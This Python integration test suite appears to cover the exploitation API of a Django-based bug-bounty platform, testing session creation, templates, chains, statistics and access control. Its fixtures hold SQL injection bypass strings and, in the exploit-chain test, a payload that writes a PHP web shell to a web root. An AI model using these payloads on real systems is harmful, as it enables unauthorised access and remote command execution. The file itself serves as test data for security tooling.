"""
Integration tests for Exploitation API endpoints
"""

import pytest
import json
from unittest.mock import Mock, patch, AsyncMock
from django.test import TransactionTestCase
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

from apps.exploitation.models import (
    ExploitationSession, ExploitResult, ExploitChain, ExploitTemplate,
    ExploitationType, ExploitationStatus, ExploitationSeverity
)
from apps.vulnerabilities.models import Vulnerability
from tests.factories import (
    UserFactory, TargetFactory, ScanSessionFactory, VulnerabilityFactory,
    ExploitationSessionFactory, ExploitResultFactory
)


@pytest.mark.integration
@pytest.mark.django_db(transaction=True)
class TestExploitationAPIEndpoints(TransactionTestCase):
    """Test exploitation API endpoints"""

    def setUp(self):
        self.client = APIClient()
        self.user = UserFactory()
        self.target = TargetFactory()
        self.scan_session = ScanSessionFactory(target=self.target)
        self.vulnerability = VulnerabilityFactory(scan_session=self.scan_session)

        # Authenticate client
        refresh = RefreshToken.for_user(self.user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

    def test_create_exploitation_session(self):
        """Test creating a new exploitation session"""
        exploitation_data = {
            'vulnerability_id': self.vulnerability.id,
            'target_id': self.target.id,
            'exploitation_type': ExploitationType.SQL_INJECTION,
            'automated': True,
            'payloads_used': [
                "admin' OR '1'='1' --",
                "' UNION SELECT 1,2,3 --"
            ],
            'notes': 'Automated exploitation attempt'
        }

        response = self.client.post('/api/exploitation/', exploitation_data, format='json')
        self.assertEqual(response.status_code, 201)

        # Verify exploitation session was created
        session = ExploitationSession.objects.get(id=response.data['id'])
        self.assertEqual(session.vulnerability, self.vulnerability)
        self.assertEqual(session.target, self.target)
        self.assertEqual(session.exploitation_type, ExploitationType.SQL_INJECTION)
        self.assertTrue(session.automated)

    def test_list_exploitation_sessions(self):
        """Test listing exploitation sessions"""
        sessions = ExploitationSessionFactory.create_batch(
            3, vulnerability=self.vulnerability, target=self.target
        )

        response = self.client.get('/api/exploitation/')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(response.data['results']), 3)

    def test_retrieve_exploitation_session(self):
        """Test retrieving a specific exploitation session"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target
        )

        response = self.client.get(f'/api/exploitation/{session.id}/')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data['id'], session.id)
        self.assertEqual(response.data['vulnerability_id'], self.vulnerability.id)

    def test_update_exploitation_session(self):
        """Test updating an exploitation session"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target,
            status=ExploitationStatus.PENDING
        )

        update_data = {
            'status': ExploitationStatus.RUNNING,
            'severity': ExploitationSeverity.HIGH,
            'notes': 'Updated exploitation notes'
        }

        response = self.client.patch(
            f'/api/exploitation/{session.id}/',
            update_data,
            format='json'
        )
        self.assertEqual(response.status_code, 200)

        # Verify update
        session.refresh_from_db()
        self.assertEqual(session.status, ExploitationStatus.RUNNING)
        self.assertEqual(session.severity, ExploitationSeverity.HIGH)

    @patch('services.exploitation_service.ExploitationService.start_exploitation')
    def test_start_exploitation(self, mock_start):
        """Test starting an exploitation session"""
        mock_start.return_value = {
            'task_id': 'exploit-task-123',
            'status': 'started',
            'estimated_duration': 300
        }

        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target,
            status=ExploitationStatus.PENDING
        )

        response = self.client.post(f'/api/exploitation/{session.id}/start/')
        self.assertEqual(response.status_code, 200)
        self.assertIn('task_id', response.data)

        mock_start.assert_called_once_with(session.id)

    @patch('services.exploitation_service.ExploitationService.stop_exploitation')
    def test_stop_exploitation(self, mock_stop):
        """Test stopping a running exploitation session"""
        mock_stop.return_value = {'status': 'stopped'}

        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target,
            status=ExploitationStatus.RUNNING
        )

        response = self.client.post(f'/api/exploitation/{session.id}/stop/')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data['status'], 'stopped')

        mock_stop.assert_called_once_with(session.id)

    def test_exploitation_results(self):
        """Test getting exploitation results"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target
        )

        # Create exploit results
        results = ExploitResultFactory.create_batch(3, session=session)

        response = self.client.get(f'/api/exploitation/{session.id}/results/')
        self.assertEqual(response.status_code, 200)

        results_data = response.data
        self.assertIn('results', results_data)
        self.assertEqual(len(results_data['results']), 3)
        self.assertIn('success_rate', results_data)
        self.assertIn('total_attempts', results_data)

    def test_exploitation_progress(self):
        """Test getting exploitation progress"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target,
            status=ExploitationStatus.RUNNING,
            exploit_chain_data={
                'steps': [
                    {'step': 1, 'action': 'reconnaissance', 'status': 'completed'},
                    {'step': 2, 'action': 'exploitation', 'status': 'in_progress'},
                    {'step': 3, 'action': 'post_exploitation', 'status': 'pending'}
                ],
                'current_step': 2
            }
        )

        response = self.client.get(f'/api/exploitation/{session.id}/progress/')
        self.assertEqual(response.status_code, 200)

        progress_data = response.data
        self.assertIn('current_step', progress_data)
        self.assertIn('total_steps', progress_data)
        self.assertIn('completion_percentage', progress_data)
        self.assertIn('estimated_time_remaining', progress_data)

    def test_filter_exploitation_by_status(self):
        """Test filtering exploitation sessions by status"""
        ExploitationSessionFactory.create_batch(
            2, vulnerability=self.vulnerability, target=self.target,
            status=ExploitationStatus.SUCCESSFUL
        )
        ExploitationSessionFactory.create_batch(
            3, vulnerability=self.vulnerability, target=self.target,
            status=ExploitationStatus.FAILED
        )

        # Filter by successful status
        response = self.client.get('/api/exploitation/?status=successful')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(response.data['results']), 2)

    def test_filter_exploitation_by_type(self):
        """Test filtering exploitation sessions by type"""
        ExploitationSessionFactory.create_batch(
            2, vulnerability=self.vulnerability, target=self.target,
            exploitation_type=ExploitationType.SQL_INJECTION
        )
        ExploitationSessionFactory.create_batch(
            3, vulnerability=self.vulnerability, target=self.target,
            exploitation_type=ExploitationType.XSS
        )

        response = self.client.get('/api/exploitation/?type=sql_injection')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(response.data['results']), 2)

    def test_exploitation_templates(self):
        """Test getting exploitation templates"""
        response = self.client.get('/api/exploitation/templates/')
        self.assertEqual(response.status_code, 200)

        templates = response.data
        self.assertIn('templates', templates)
        self.assertIsInstance(templates['templates'], list)

    def test_create_exploit_template(self):
        """Test creating a new exploit template"""
        template_data = {
            'name': 'SQL Injection Template',
            'exploitation_type': ExploitationType.SQL_INJECTION,
            'payload_template': "{username}' OR '1'='1' --",
            'configuration': {
                'timeout': 30,
                'retries': 3,
                'user_agent': 'BugBountyBot/1.0'
            },
            'prerequisites': [
                'Target must have SQL injection vulnerability',
                'Authentication may be required'
            ]
        }

        response = self.client.post('/api/exploitation/templates/', template_data, format='json')
        self.assertEqual(response.status_code, 201)

        # Verify template was created
        template = ExploitTemplate.objects.get(id=response.data['id'])
        self.assertEqual(template.name, 'SQL Injection Template')
        self.assertEqual(template.exploitation_type, ExploitationType.SQL_INJECTION)

    def test_exploitation_chains(self):
        """Test exploitation chain functionality"""
        # Create an exploit chain
        chain_data = {
            'name': 'SQL to RCE Chain',
            'description': 'SQL injection leading to remote code execution',
            'chain_steps': [
                {
                    'step': 1,
                    'name': 'SQL Injection Discovery',
                    'payload': "admin' OR '1'='1' --",
                    'expected_result': 'Authentication bypass'
                },
                {
                    'step': 2,
                    'name': 'File Upload via SQL',
                    'payload': "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php' --",
                    'expected_result': 'Web shell uploaded'
                }
            ]
        }

        response = self.client.post('/api/exploitation/chains/', chain_data, format='json')
        self.assertEqual(response.status_code, 201)

        # Test listing chains
        response = self.client.get('/api/exploitation/chains/')
        self.assertEqual(response.status_code, 200)
        self.assertGreater(len(response.data['results']), 0)

    @patch('services.exploitation_service.ExploitationService.execute_chain')
    def test_execute_exploitation_chain(self, mock_execute_chain):
        """Test executing an exploitation chain"""
        mock_execute_chain.return_value = {
            'chain_id': 1,
            'status': 'completed',
            'successful_steps': 2,
            'total_steps': 2,
            'results': [
                {'step': 1, 'status': 'success', 'evidence': 'Auth bypass confirmed'},
                {'step': 2, 'status': 'success', 'evidence': 'Shell uploaded successfully'}
            ]
        }

        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target
        )

        chain_execution_data = {
            'chain_id': 1,
            'target_parameters': {
                'username_field': 'user',
                'password_field': 'pass'
            }
        }

        response = self.client.post(
            f'/api/exploitation/{session.id}/execute-chain/',
            chain_execution_data,
            format='json'
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data['successful_steps'], 2)

    def test_exploitation_statistics(self):
        """Test exploitation statistics endpoint"""
        # Create exploitation sessions with different statuses
        ExploitationSessionFactory.create_batch(
            3, vulnerability=self.vulnerability, target=self.target,
            status=ExploitationStatus.SUCCESSFUL
        )
        ExploitationSessionFactory.create_batch(
            2, vulnerability=self.vulnerability, target=self.target,
            status=ExploitationStatus.FAILED
        )
        ExploitationSessionFactory.create_batch(
            1, vulnerability=self.vulnerability, target=self.target,
            status=ExploitationStatus.RUNNING
        )

        response = self.client.get('/api/exploitation/statistics/')
        self.assertEqual(response.status_code, 200)

        stats = response.data
        self.assertEqual(stats['total'], 6)
        self.assertEqual(stats['successful'], 3)
        self.assertEqual(stats['failed'], 2)
        self.assertEqual(stats['running'], 1)
        self.assertIn('success_rate', stats)

    def test_vulnerability_exploitation_recommendations(self):
        """Test getting exploitation recommendations for a vulnerability"""
        response = self.client.get(
            f'/api/exploitation/recommendations/?vulnerability_id={self.vulnerability.id}'
        )
        self.assertEqual(response.status_code, 200)

        recommendations = response.data
        self.assertIn('recommendations', recommendations)
        self.assertIn('difficulty_assessment', recommendations)
        self.assertIn('required_tools', recommendations)

    def test_bulk_exploitation_operations(self):
        """Test bulk exploitation operations"""
        # Create multiple vulnerabilities
        vulnerabilities = VulnerabilityFactory.create_batch(3, scan_session=self.scan_session)
        vulnerability_ids = [v.id for v in vulnerabilities]

        bulk_data = {
            'vulnerability_ids': vulnerability_ids,
            'exploitation_type': ExploitationType.AUTOMATED_SCAN,
            'automated': True,
            'notes': 'Bulk automated exploitation'
        }

        response = self.client.post('/api/exploitation/bulk/', bulk_data, format='json')
        self.assertEqual(response.status_code, 201)

        # Verify exploitation sessions were created
        sessions = ExploitationSession.objects.filter(
            vulnerability__in=vulnerabilities
        )
        self.assertEqual(sessions.count(), 3)

    def test_exploitation_evidence_upload(self):
        """Test uploading evidence for exploitation results"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target
        )
        result = ExploitResultFactory(session=session)

        with patch('django.core.files.storage.default_storage.save') as mock_save:
            mock_save.return_value = 'evidence/exploits/proof_001.png'

            response = self.client.post(
                f'/api/exploitation/{session.id}/results/{result.id}/evidence/',
                {
                    'evidence_type': 'screenshot',
                    'description': 'Proof of successful exploitation',
                    'file': 'mock_file_content'
                },
                format='multipart'
            )
            self.assertEqual(response.status_code, 201)

    def test_exploitation_export(self):
        """Test exporting exploitation results"""
        session = ExploitationSessionFactory(
            vulnerability=self.vulnerability,
            target=self.target
        )

        # Test JSON export
        response = self.client.get(f'/api/exploitation/{session.id}/export/?format=json')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response['Content-Type'], 'application/json')

        # Test detailed report export
        response = self.client.get(f'/api/exploitation/{session.id}/export/?format=report')
        self.assertEqual(response.status_code, 200)

    def test_unauthorized_access(self):
        """Test unauthorized access to exploitation endpoints"""
        self.client.credentials()

        response = self.client.get('/api/exploitation/')
        self.assertEqual(response.status_code, 401)

    def test_invalid_exploitation_data(self):
        """Test creating exploitation session with invalid data"""
        invalid_data = {
            'vulnerability_id': 999999,  # Non-existent vulnerability
            'target_id': 999999,         # Non-existent target
            'exploitation_type': 'invalid_type',  # Invalid type
            'payloads_used': 'should_be_array'    # Should be array
        }

        response = self.client.post('/api/exploitation/', invalid_data, format='json')
        self.assertEqual(response.status_code, 400)

    def test_exploitation_session_pagination(self):
        """Test exploitation session list pagination"""
        ExploitationSessionFactory.create_batch(
            15, vulnerability=self.vulnerability, target=self.target
        )

        response = self.client.get('/api/exploitation/?page=1&page_size=10')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(response.data['results']), 10)
        self.assertIsNotNone(response.data['next'])

    def test_exploitation_session_ordering(self):
        """Test exploitation session list ordering"""
        from django.utils import timezone
        import datetime

        # Create sessions at different times
        old_time = timezone.now() - datetime.timedelta(hours=2)
        recent_time = timezone.now() - datetime.timedelta(hours=1)

        with patch('django.utils.timezone.now', return_value=old_time):
            session1 = ExploitationSessionFactory(
                vulnerability=self.vulnerability, target=self.target
            )

        with patch('django.utils.timezone.now', return_value=recent_time):
            session2 = ExploitationSessionFactory(
                vulnerability=self.vulnerability, target=self.target
            )

        # Test ordering by created date (descending - most recent first)
        response = self.client.get('/api/exploitation/?ordering=-created_at')
        self.assertEqual(response.status_code, 200)

        results = response.data['results']
        self.assertEqual(results[0]['id'], session2.id)  # Most recent first
        self.assertEqual(results[1]['id'], session1.id)  # Older second